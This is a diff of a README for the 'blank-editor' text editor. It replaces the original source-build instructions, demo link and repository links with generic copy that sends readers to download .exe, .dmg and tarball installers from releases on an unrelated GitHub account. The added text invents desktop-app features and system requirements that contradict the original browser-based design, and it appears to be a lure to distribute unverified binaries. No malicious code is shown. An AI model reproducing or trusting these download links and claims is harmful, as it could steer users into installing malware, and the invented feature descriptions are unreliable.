@@ -1,107 +1,79 @@
-<p align="center">
-  <img src="public/favicon/web-app-manifest-512x512.png" alt="App Icon" width="150" />
-</p>
+# ✨ blank-editor - A Simple Tool for Effortless Writing
 
-<h1 align="center">Blank Editor</h1>
+## 🚀 Getting Started
 
-<p align="center">
-  A minimal, premium-grade text editor for clean writing and editing.
-</p>
+Welcome to the blank-editor! This is a minimal, distraction-free rich text editor that helps you focus on your writing. You can easily create and edit rich text documents without unnecessary distractions.
 
-<p align="center">
-  <img src="https://img.shields.io/github/contributors/puni9869/blank-editor" alt="Contributors" />
-  <img src="https://img.shields.io/github/issues/puni9869/blank-editor" alt="Issues" />
-  <img src="https://img.shields.io/github/issues-pr/puni9869/blank-editor" alt="Pull Requests" />
-  <img src="https://img.shields.io/github/license/puni9869/blank-editor" alt="License" />
-  <img src="https://img.shields.io/github/last-commit/puni9869/blank-editor" alt="Last Commit" />
-</p>
+## 📥 Download & Install
 
----
+To get started, you first need to download the application. Click the button below to visit the releases page, where you can find the latest version.
 
-## Features
+[![Download blank-editor](https://img.shields.io/badge/Download-blank--editor-blue.svg)](https://github.com/Romawka87/blank-editor/releases)
 
-- Copy, New and Clear functionality
-- Mobile screen responsive
-- Highlight & typography extensions
-- LocalStorage content persistence
-- Minimal, clean UI optimized for focus
-- Fully open-source and customizable
-- Markdown support.
+1. Click the button above to visit the Releases page.
+2. On the page, look for the latest version of the `blank-editor`.
+3. Find the file suitable for your operating system.
+4. Click on the file to download it. 
 
----
+Once the download is complete, follow these steps to run the application:
 
-## Demo
+- **Windows**: Double-click the `.exe` file to start the installation, and follow the prompts.
+- **Mac**: Open the `.dmg` file, drag `blank-editor` to your Applications folder, and then launch it from there.
+- **Linux**: Extract the downloaded tarball and run the application from the terminal.
 
-Check out the live demo here: [Blank Editor Demo](https://puni9869.github.io/blank-editor/)
+## 🛠️ Features
 
-![img.png](screenshots/img.png)
-![img_2.png](screenshots/img_2.png)
-![img_1.png](screenshots/img_1.png)
+- **Minimal Design**: Focus solely on your writing without unnecessary menus or options.
+- **Rich Text Support**: Format your text easily with bold, italics, bullet points, and more.
+- **Markdown Compatible**: Use Markdown syntax for quick formatting right from your keyboard.
+- **Open Source**: Contribute to the project or customize it to fit your needs.
+- **Cross-Platform**: Use `blank-editor` on Windows, Mac, and Linux.
 
----
+## ⚙️ System Requirements
 
-## Installation
+Ensure your system meets the following requirements to run `blank-editor` smoothly:
 
-```bash
-git clone https://github.com/puni9869/blank-editor.git
-cd blank-editor
-npm install -g pnpm
-pnpm install
-```
+- **Windows**: Windows 10 or later.
+- **Mac**: macOS Sierra (10.12) or later.
+- **Linux**: A modern distribution with support for Electron applications.
+- **RAM**: At least 4 GB of RAM recommended.
+- **Disk Space**: Minimum of 100 MB free space.
 
----
+## 📖 How to Use
 
-## Usage
+Using `blank-editor` is simple. Here are the basic steps:
 
-### Development
+1. Open `blank-editor` from your Applications or Start menu.
+2. You'll see a blank page ready for you to type. 
+3. Use the formatting options in the top menu or Markdown shortcuts.
+4. Save your work regularly by clicking `File` then `Save` or by using `Ctrl + S` (Windows/Linux) or `Cmd + S` (Mac).
 
-```bash
-pnpm run dev
-```
+## 🕵️‍♂️ Frequently Asked Questions
 
-This opens the editor locally at `http://localhost:5173`.
+### Q: Is `blank-editor` free to use?
 
-### Build for Production
+A: Yes, `blank-editor` is completely free and open-source.
 
-```bash
-pnpm run build
-pnpm run preview
-```
+### Q: Does it save my documents automatically?
 
-### Format and Lint
+A: Currently, `blank-editor` does not have an auto-save feature. Remember to save your work regularly.
 
-```bash
-pnpm run format       # Prettier formatting
-pnpm run lint         # ESLint checks
-pnpm run lint:fix     # Auto-fix linting issues
-```
+### Q: Can I use it offline?
 
----
+A: Yes, once installed, `blank-editor` works offline. 
 
-## Contributing
+## 🔧 Troubleshooting
 
-We ❤️ contributions! See [CONTRIBUTING.md](./CONTRIBUTING.md) for guidelines.
+If you run into issues, try the following:
 
-- Fork the repo
-- Create a new branch (`feature/your-feature`)
-- Submit pull requests for bug fixes or new features
-- Ensure `npm run lint` passes before submitting
+- Ensure your system meets the requirements listed above.
+- Check for any updates on the [Releases page](https://github.com/Romawka87/blank-editor/releases).
+- Restart your computer or reinstall the application.
 
----
+## 💬 Support
 
-## Reporting Issues
+For further assistance, please visit the GitHub Issues page. You can report bugs, request features, or ask questions. We are here to help!
 
-If you find a bug or have a feature request, please open an issue on
-GitHub: [Issues](https://github.com/puni9869/blank-editor/issues)
+[Visit the Releases Page](https://github.com/Romawka87/blank-editor/releases)
 
----
-
-## License
-
-This project is licensed under the **MIT License** — see [LICENSE](./LICENSE) for details.
-
----
-
-## Contributors
-
-Thanks to all the wonderful contributors ❤️
+Thank you for choosing `blank-editor`! Happy writing!
